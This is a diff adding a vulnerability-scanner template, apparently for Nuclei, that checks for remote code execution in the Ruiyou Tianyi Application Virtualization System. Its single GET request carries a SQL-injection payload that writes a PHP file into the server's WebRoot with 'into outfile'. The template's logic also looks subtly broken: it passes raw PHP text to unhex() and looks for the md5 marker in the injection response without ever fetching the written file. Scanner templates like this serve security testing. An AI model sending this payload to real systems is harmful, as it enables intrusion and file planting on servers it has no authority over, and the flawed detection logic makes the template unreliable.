@@ -1,0 +1,23 @@
+id: ruiyou-tianyi-rce
+info:
+  name: Ruiyou Tianyi Application Virtualization System Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Ruiyou Tianyi Application Virtualization System Remote Code Execution vulnerability allows attackers to execute arbitrary code through this vulnerability, resulting in the system being attacked and controlled.
+  reference:
+    - http://soft.realor.cn:88/Gwt7.0.3.1.exe
+http:
+  - raw:
+      - |
+        GET /index.php?s=/Index/dologin/name/demo%27)%3bselect%20unhex%28%27<?php echo md5(rand_int(1, 9999)); $file = __FILE__; unlink($file);?>%27%29%20into%20outfile%20%27%2e%5C%5C%2e%2e%5C%5C%2e%2e%5C%5CWebRoot%5C%5C{{rand_base(6)}}.XGI%27%23/pwd/123123 HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        regex:
+          - "^[a-f0-9]{32}$"
+        part: body
